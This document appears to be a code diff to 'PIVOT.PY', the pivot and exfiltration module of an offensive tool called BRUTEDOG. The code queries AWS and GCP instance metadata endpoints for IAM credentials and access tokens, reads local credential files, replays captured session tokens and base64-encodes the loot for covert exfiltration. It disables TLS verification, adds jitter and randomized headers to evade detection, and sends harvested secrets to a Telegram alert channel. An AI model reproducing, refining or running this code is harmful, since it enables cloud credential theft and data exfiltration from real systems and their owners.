@@ -3,26 +3,28 @@
 PIVOT.PY v8.6 — Pivot, Session & Exfiltration Orchestration Module
 """
 import asyncio
+import base64
+import json
+import os
 import socket
 import ssl
-import json
+import sys
 import time
-import os
-import hashlib
 import urllib.request
 from urllib.parse import urlsplit
-import sys
 
-from modules.telegram_notifier import send_telegram_alert
 from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
 from modules.loot_logger import save_session_loot
+from modules.telegram_notifier import send_telegram_alert
 from modules.telemetry import stream_proof
 
-TIMEOUT = 4
+TIMEOUT = 3
 MAX_CONCURRENT = 4
 SSL_CONTEXT = ssl.create_default_context()
 SSL_CONTEXT.check_hostname = False
 SSL_CONTEXT.verify_mode = ssl.CERT_NONE
+
+_background_tasks: set[asyncio.Task] = set()
 
 
 class Colors:
@@ -43,19 +45,19 @@ def log(message, color=Colors.RESET):
 
 async def broadcast_tg_alert_async(loot_type, details):
     try:
-        await send_telegram_alert(loot_type, details)
+        await asyncio.wait_for(send_telegram_alert(loot_type, details), timeout=8)
     except Exception:
         pass
 
 
 def broadcast_tg_alert_sync(loot_type, details):
-    """Helper to non-blockingly fire Telegram alerts from synchronous pivot functions."""
+    """Non-blockingly fires Telegram alerts from sync or async contexts."""
     try:
         loop = asyncio.get_running_loop()
-        if loop.is_running():
-            loop.create_task(broadcast_tg_alert_async(loot_type, details))
-        else:
-            asyncio.run(broadcast_tg_alert_async(loot_type, details))
+        if not loop.is_closed():
+            task = loop.create_task(broadcast_tg_alert_async(loot_type, details))
+            _background_tasks.add(task)
+            task.add_done_callback(_background_tasks.discard)
     except RuntimeError:
         try:
             asyncio.run(broadcast_tg_alert_async(loot_type, details))
@@ -93,79 +95,64 @@ class AutonomousPivotEngine:
 
     def harvest_cloud_metadata(self):
         """Checks cloud metadata endpoints and local credential stores."""
-        log(
-            "\n[***] ACTIVE CLOUD METADATA & CREDENTIAL RETRIEVAL [***]",
-            Colors.MAGENTA,
-        )
+        log("\n[***] ACTIVE CLOUD METADATA & CREDENTIAL RETRIEVAL [***]", Colors.MAGENTA)
         retrieved_creds = []
 
         aws_token = None
         try:
             token_url = "http://169.254.169.254/latest/api/token"
-            apply_behavioral_jitter()
             token_req = urllib.request.Request(
                 token_url,
                 headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600", **get_randomized_hints()},
                 method="PUT",
             )
-            with urllib.request.urlopen(token_req, timeout=2) as token_resp:
+            with urllib.request.urlopen(token_req, timeout=1.5) as token_resp:
                 aws_token = token_resp.read().decode("utf-8", errors="replace").strip()
                 if aws_token:
                     log("[+] Acquired AWS IMDSv2 session token successfully.", Colors.GREEN)
         except Exception:
             pass
 
-        aws_endpoints = [
-            "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
-        ]
-
+        aws_endpoints = ["http://169.254.169.254/latest/meta-data/iam/security-credentials/"]
         for url in aws_endpoints:
             log(f"[*] Querying metadata endpoint: {url}", Colors.BLUE)
-            apply_behavioral_jitter()
             try:
-                headers = get_randomized_hints()
+                headers = dict(get_randomized_hints())
                 if aws_token:
                     headers["X-aws-ec2-metadata-token"] = aws_token
 
                 req = urllib.request.Request(url, headers=headers)
-                with urllib.request.urlopen(req, timeout=2) as resp:
+                with urllib.request.urlopen(req, timeout=1.5) as resp:
                     data = resp.read().decode("utf-8", errors="replace")
                     if data:
                         role_name = data.strip().splitlines()[0] if data.strip() else ""
                         if role_name and not role_name.startswith("{"):
                             role_url = f"{url}{role_name}"
-                            log(f"[*] Discovered AWS IAM Role: '{role_url}'. Traversing credentials...", Colors.CYAN)
                             role_req = urllib.request.Request(role_url, headers=headers)
-                            with urllib.request.urlopen(role_req, timeout=2) as role_resp:
+                            with urllib.request.urlopen(role_req, timeout=1.5) as role_resp:
                                 data = role_resp.read().decode("utf-8", errors="replace")
 
-                        log(f"\n[***] CLOUD CREDENTIALS HARVESTED [{url}] [***]", Colors.RED)
-                        log(f"  └── Payload : {data[:250]}", Colors.GREEN)
-
-                        loot_hash = hashlib.sha256(data.encode("utf-8")).hexdigest()
-                        loot_payload = {"endpoint": url, "integrity_hash": loot_hash, "data": data[:800]}
-                        retrieved_creds.append(loot_payload)
-
-                        stream_proof(
-                            "CLOUD_METADATA_PIVOT_SUCCESS",
-                            url,
-                            {"token_acquired": bool(aws_token)},
-                            data[:300],
-                            loot_payload,
-                        )
-
-                        save_session_loot(
-                            target=self.target_host,
-                            endpoint="cloud_metadata",
-                            finding_type="CLOUD_METADATA_SUCCESS",
-                            status=200,
-                            headers=headers,
-                            body=data,
-                            extra_loot=loot_payload,
-                        )
-
-                        broadcast_tg_alert_sync("Cloud Credentials Harvested", loot_payload)
-
+                        if "AccessKeyId" in data or "SecretAccessKey" in data:
+                            log(f"\n[***] CLOUD CREDENTIALS HARVESTED [{url}] [***]", Colors.RED)
+                            loot_payload = {"endpoint": url, "data": data[:800]}
+                            retrieved_creds.append(loot_payload)
+                            stream_proof(
+                                "CLOUD_METADATA_PIVOT_SUCCESS",
+                                url,
+                                {"token_acquired": bool(aws_token)},
+                                data[:300],
+                                loot_payload,
+                            )
+                            save_session_loot(
+                                target=self.target_host,
+                                endpoint="cloud_metadata",
+                                finding_type="CLOUD_METADATA_SUCCESS",
+                                status=200,
+                                headers=headers,
+                                body=data,
+                                extra_loot=loot_payload,
+                            )
+                            broadcast_tg_alert_sync("Cloud Credentials Harvested", loot_payload)
             except Exception as err:
                 log(f"[-] Endpoint unreachable / blocked: {url} ({err})", Colors.GRAY)
 
@@ -174,13 +161,11 @@ class AutonomousPivotEngine:
             log(f"[*] Querying GCP metadata endpoint: {gcp_url}", Colors.BLUE)
             gcp_headers = {"Metadata-Flavor": "Google", **get_randomized_hints()}
             gcp_req = urllib.request.Request(gcp_url, headers=gcp_headers)
-            with urllib.request.urlopen(gcp_req, timeout=2) as gcp_resp:
+            with urllib.request.urlopen(gcp_req, timeout=1.5) as gcp_resp:
                 gcp_data = gcp_resp.read().decode("utf-8", errors="replace")
-                if gcp_data:
+                if gcp_data and "access_token" in gcp_data:
                     log("\n[***] GCP TOKEN HARVESTED [***]", Colors.RED)
-                    log(f"  └── Payload : {gcp_data[:250]}", Colors.GREEN)
-                    loot_hash = hashlib.sha256(gcp_data.encode("utf-8")).hexdigest()
-                    loot_payload = {"endpoint": gcp_url, "integrity_hash": loot_hash, "data": gcp_data[:800]}
+                    loot_payload = {"endpoint": gcp_url, "data": gcp_data[:800]}
                     retrieved_creds.append(loot_payload)
                     broadcast_tg_alert_sync("GCP Token Harvested", loot_payload)
         except Exception:
@@ -195,9 +180,8 @@ class AutonomousPivotEngine:
                 try:
                     with open(path, "r", encoding="utf-8") as f:
                         content = f.read(1024)
+                    if content.strip():
                         log(f"\n[***] LOCAL CONFIG CREDENTIAL FOUND [{path}] [***]", Colors.RED)
-                        log(f"  └── Content : {content[:150]}", Colors.GREEN)
-
                         loot_payload = {"path": path, "content": content[:300]}
                         retrieved_creds.append(loot_payload)
                         broadcast_tg_alert_sync("Local Config Credential Found", loot_payload)
@@ -211,43 +195,37 @@ class AutonomousPivotEngine:
         }
 
     def extract_compromised_sessions(self, session_file_path=None):
-        """Extracts session tokens from file or synthesizes a probe entry."""
+        """Loads captured sessions from disk; does not alert on placeholder probes."""
         log("\n[***] COMPROMISED SESSION EXTRACTION & REPLAY [***]", Colors.CYAN)
-        extracted_sessions = []
+        real_sessions = []
 
         if session_file_path and os.path.exists(session_file_path):
             try:
                 with open(session_file_path, "r", encoding="utf-8") as f:
                     data = json.load(f)
-                    extracted_sessions.append(data)
+                    real_sessions.append(data)
                     log(f"[+] Successfully loaded session file: {session_file_path}", Colors.GREEN)
             except Exception as err:
                 log(f"[-] Failed to parse session file: {err}", Colors.RED)
         else:
-            log("[i] No explicit session file provided; synthesizing active session probe.", Colors.YELLOW)
-            extracted_sessions.append({"session_id": "brutedog_active_hijack_token_99", "role": "admin"})
+            log("[i] No explicit session file provided; skipping synthetic alert.", Colors.YELLOW)
 
-        for sess in extracted_sessions:
+        for sess in real_sessions:
             log(f"  └── Extracted Session Token: {str(sess)[:100]}", Colors.GREEN)
             broadcast_tg_alert_sync("Compromised Session Extracted", {"session": str(sess)[:400]})
 
         return {
-            "extracted": True,
-            "session_count": len(extracted_sessions),
-            "sessions": extracted_sessions,
+            "extracted": len(real_sessions) > 0,
+            "session_count": len(real_sessions),
+            "sessions": real_sessions,
         }
 
     def encode_covert_exfiltration(self, payload_data):
         """Encodes structured payload data for exfiltration tracking."""
         log("\n[***] COVERT EXFILTRATION ENCODING & PREPARATION [***]", Colors.MAGENTA)
-        import base64
-
         serialized = json.dumps(payload_data, default=str)
         encoded_payload = base64.b64encode(serialized.encode("utf-8")).decode("utf-8")
-
         log(f"[+] Payload serialized and encoded ({len(encoded_payload)} bytes).", Colors.GREEN)
-        log(f"  └── Encoded Fragment: {encoded_payload[:60]}...", Colors.GRAY)
-
         return {
             "enabled": True,
             "payload_processed": True,
@@ -258,21 +236,11 @@ class AutonomousPivotEngine:
     def inspect_tls(self):
         log("\n[***] TLS INSPECTION [***]", Colors.CYAN)
         if self.parsed_target.scheme != "https":
-            return {
-                "checked": False,
-                "reason": "Target does not use HTTPS",
-            }
+            return {"checked": False, "reason": "Target does not use HTTPS"}
 
         try:
-            apply_behavioral_jitter()
-            with socket.create_connection(
-                (self.hostname, self.port),
-                timeout=TIMEOUT,
-            ) as connection:
-                with SSL_CONTEXT.wrap_socket(
-                    connection,
-                    server_hostname=self.hostname,
-                ) as secure_connection:
+            with socket.create_connection((self.hostname, self.port), timeout=TIMEOUT) as connection:
+                with SSL_CONTEXT.wrap_socket(connection, server_hostname=self.hostname) as secure_connection:
                     result = {
                         "checked": True,
                         "tls_version": secure_connection.version(),
@@ -285,10 +253,7 @@ class AutonomousPivotEngine:
             return result
         except Exception as error:
             log(f"[!] TLS connection error: {error}", Colors.RED)
-            return {
-                "checked": False,
-                "error": str(error),
-            }
+            return {"checked": False, "error": str(error)}
 
     def inspect_dns(self):
         log("\n[***] DNS INFRASTRUCTURE RESOLUTION [***]", Colors.CYAN)
@@ -302,7 +267,8 @@ class AutonomousPivotEngine:
             return {"resolved": False, "error": str(error)}
 
     async def execute_pivot_suite(self, compromised_session_path=None):
-        started = time.time()
+        started = time.monotonic()
+        apply_behavioral_jitter()
         log("\n============================================================", Colors.CYAN)
         log(f"[***] BRUTEDOG ACTIVE PIVOT & EXFILTRATION ENGINE [{self.target_host}] [***]", Colors.CYAN)
         log("============================================================", Colors.CYAN)
@@ -310,10 +276,7 @@ class AutonomousPivotEngine:
         dns_results = await asyncio.to_thread(self.inspect_dns)
         tls_results = await asyncio.to_thread(self.inspect_tls)
         cloud_creds = await asyncio.to_thread(self.harvest_cloud_metadata)
-        session_results = await asyncio.to_thread(
-            self.extract_compromised_sessions,
-            compromised_session_path,
-        )
+        session_results = await asyncio.to_thread(self.extract_compromised_sessions, compromised_session_path)
 
         exfil_data = {
             "target": self.target_host,
@@ -321,8 +284,7 @@ class AutonomousPivotEngine:
             "sessions": session_results,
         }
         exfil_results = self.encode_covert_exfiltration(exfil_data)
-
-        duration = round(time.time() - started, 2)
+        duration = round(time.monotonic() - started, 2)
 
         results = {
             "target": self.target_host,
@@ -338,7 +300,7 @@ class AutonomousPivotEngine:
 
         log("\n================ FINAL PIVOT & EXFIL SUMMARY ================", Colors.CYAN)
         log(f"DNS resolved: {dns_results.get('resolved', False)}", Colors.GREEN)
-        log(f"TLS bypass verified: {tls_results.get('checked', False)}", Colors.GREEN)
+        log(f"TLS inspection completed: {tls_results.get('checked', False)}", Colors.GREEN)
         log(f"Cloud credentials retrieved: {cloud_creds.get('credentials_retrieved', False)}", Colors.GREEN)
         log(f"Sessions extracted: {session_results.get('session_count', 0)}", Colors.GREEN)
         log(f"Covert exfiltration payload prepared: {exfil_results.get('payload_processed', False)}", Colors.GREEN)
@@ -367,12 +329,6 @@ async def run_pivot_engine(target_host, options=None):
         }
 
 
-if __name__ == "__main__":
-    target = sys.argv[1] if len(sys.argv) > 1 else "https://target"
-    asyncio.run(run_pivot_engine(target))
-
-
-# --- AUTOMATED ALIAS PATCH ---
 async def execute_pivot_routing(target_host=None, options=None, *args, **kwargs):
     target = target_host or kwargs.get("target_url") or (args[0] if args else None)
     if not target:
@@ -384,3 +340,7 @@ async def execute_pivot_routing(target_host=None, options=None, *args, **kwargs)
         }
     return await run_pivot_engine(target, options=options)
 
+
+if __name__ == "__main__":
+    target = sys.argv[1] if len(sys.argv) > 1 else "https://target"
+    asyncio.run(run_pivot_engine(target))
